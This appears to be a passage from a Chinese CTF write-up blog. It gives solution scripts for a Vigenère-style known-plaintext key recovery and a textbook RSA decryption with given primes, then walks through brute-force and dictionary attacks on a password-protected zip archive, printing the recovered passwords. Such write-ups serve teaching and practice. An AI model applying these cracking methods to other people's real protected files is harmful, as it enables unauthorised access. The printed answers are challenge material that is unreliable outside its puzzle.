&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 函数功能：把字母变成‘*’，保留标点符号&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;get_feature&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;s&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;.join([&lt;span class=&#34;string&#34;&gt;&amp;#x27;*&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; c.isalpha() &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; c &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; c &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; s]) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 用original文件夹初始化template，并将原文保存在txts_ori里面&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;path_ori=&lt;span class=&#34;string&#34;&gt;&amp;#x27;original&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;files_ori=os.listdir(path_ori)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;template=[]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;txts_ori = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; file &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; files_ori:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	position = path_ori+&lt;span class=&#34;string&#34;&gt;&amp;#x27;\\&amp;#x27;&lt;/span&gt;+ file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(position, &lt;span class=&#34;string&#34;&gt;&amp;quot;r&amp;quot;&lt;/span&gt;,encoding=&lt;span class=&#34;string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; f:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		data = f.read()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		m=get_feature(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(m)!=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; m &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; template:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			txts_ori.append(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			template.append(m)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 处理encrypt文件夹内的数据，在template里匹配对应的原文，得到对应的密钥&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;keys=[-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]*&lt;span class=&#34;number&#34;&gt;410&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;path_enc=&lt;span class=&#34;string&#34;&gt;&amp;#x27;encrypt&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;files_enc=os.listdir(path_enc)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; file &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; files_enc:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	position = path_enc+&lt;span class=&#34;string&#34;&gt;&amp;#x27;\\&amp;#x27;&lt;/span&gt;+ file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(position, &lt;span class=&#34;string&#34;&gt;&amp;quot;r&amp;quot;&lt;/span&gt;,encoding=&lt;span class=&#34;string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; f:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		data = f.read()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		m=get_feature(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(m)!=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; m &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; template:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(data)):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				k=((&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(data[i])-&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(txts_ori[template.index(m)][i]))%&lt;span class=&#34;number&#34;&gt;26&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				j=i%(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(keys))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;comment&#34;&gt;#保证每次写入keys时该位置没有写入过，且对应密文不是标点符号&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; keys[j]==-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; m[i]==&lt;span class=&#34;string&#34;&gt;&amp;#x27;*&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					keys[j]=k&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 用keys解密&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;enc=&lt;span class=&#34;string&#34;&gt;&amp;quot;xaawr&amp;#123;B0_d0l_cs0m_&amp;#x27;Pp0mn-odn1vpabt_deqzcq&amp;#x27;?&amp;#125;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;result = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(enc)):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; enc[i].isupper():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		result += &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;((&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(enc[i]) - keys[i] - &lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;A&amp;#x27;&lt;/span&gt;)) % &lt;span class=&#34;number&#34;&gt;26&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;A&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;elif&lt;/span&gt; enc[i].islower():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		result += &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;((&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(enc[i]) - keys[i] - &lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;)) % &lt;span class=&#34;number&#34;&gt;26&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		result += enc[i]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(result)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;easy-rsa&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#easy-rsa&#34;&gt;#&lt;/a&gt; Easy RSA&lt;/h3&gt;
&lt;p&gt;这道题，还是不细说了，属于是最最最基本的 RSA 了，&lt;br /&gt;
该给的全都给了，连 p, q 都直接给了&lt;br /&gt;
 exp:&lt;br /&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; gmpy2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; Crypto.Util.number &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; long_to_bytes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;string=[]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (e,p,q,c) &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; [(&lt;span class=&#34;number&#34;&gt;12433&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;149&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;197&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;104&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;8147&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;131&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;167&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;6633&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;10687&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;211&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;197&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;35594&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;19681&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;131&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;211&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;15710&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;33577&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;251&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;211&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;38798&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;30241&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;157&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;251&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;35973&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;293&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;211&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;157&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;31548&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;26459&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;179&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;149&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;4778&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;27479&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;149&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;223&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;32728&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;9029&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;223&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;137&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;20696&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;4649&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;149&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;151&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;13418&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;11783&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;223&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;251&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;14239&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;13537&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;179&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;137&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;11702&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;3835&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;167&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;139&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;20051&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;30983&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;149&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;227&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;23928&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;17581&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;157&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;131&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;5855&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;35381&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;223&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;179&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;37774&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;2357&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;151&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;223&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1849&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;22649&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;211&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;229&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;7348&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;1151&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;179&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;223&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;17982&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;8431&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;251&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;163&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;30226&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;38501&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;193&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;211&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;30559&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;14549&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;211&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;151&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;21143&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;24781&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;239&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;241&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;45604&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;8051&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;179&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;131&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;7994&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;863&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;181&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;131&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;11493&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;1117&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;239&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;157&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;12579&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;7561&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;149&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;199&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;8960&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;19813&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;239&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;229&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;53463&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;4943&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;131&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;157&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;14606&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;29077&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;191&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;181&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;33446&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;18583&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;211&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;163&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;31800&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;30643&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;173&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;191&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;27293&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;11617&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;223&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;251&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;13448&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;19051&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;191&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;151&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;21676&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;18367&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;179&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;157&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;14139&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;18861&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;149&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;191&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;5139&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;9581&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;211&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;193&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;25595&lt;/span&gt;)]:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	d = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(gmpy2.invert(e, (p-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)*(q-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	m = &lt;span class=&#34;built_in&#34;&gt;pow&lt;/span&gt;(c, d, p*q)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	string.append(long_to_bytes(m).decode())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Str=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.join(string)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(Str)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;misc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#misc&#34;&gt;#&lt;/a&gt; Misc&lt;/h2&gt;
&lt;h3 id=&#34;这个压缩包有点麻烦&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#这个压缩包有点麻烦&#34;&gt;#&lt;/a&gt; 这个压缩包有点麻烦&lt;/h3&gt;
&lt;p&gt;这道题属实是把那些，基本的有关压缩包的方法都涉及到了，挺全面的入门题&lt;/p&gt;
&lt;h4 id=&#34;暴力破解&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#暴力破解&#34;&gt;#&lt;/a&gt; 暴力破解&lt;/h4&gt;
&lt;p&gt;打开压缩包，三个文件都被加密，不太正常，所以考虑暴力破解或者是伪加密能直接解出。&lt;br /&gt;
用 010 打开，文件最后出现提示：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Pure numeric passwords within 6 digits are not safe!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;所以用 ARCHPR 暴力破解，范围仅勾选数字，得到密码：483279&lt;/p&gt;
&lt;h4 id=&#34;字典攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#字典攻击&#34;&gt;#&lt;/a&gt; 字典攻击&lt;/h4&gt;
&lt;p&gt;上一轮的密码解压得到三个文件：flag.zip、password-note.txt、README.txt&lt;br /&gt;
 要解压 flag.zip 又需要密码，打开 README.txt 看到提示：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I don&#39;t know if it&#39;s a good idea to write down all the passwords.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;显然 passwords 可能的都被写在 password-note.txt 里面了&lt;br /&gt;
用 ARCHPR 的字典攻击即可，得到密码：&amp;amp;-`;qpCKliw2yTR\&lt;/p&gt;
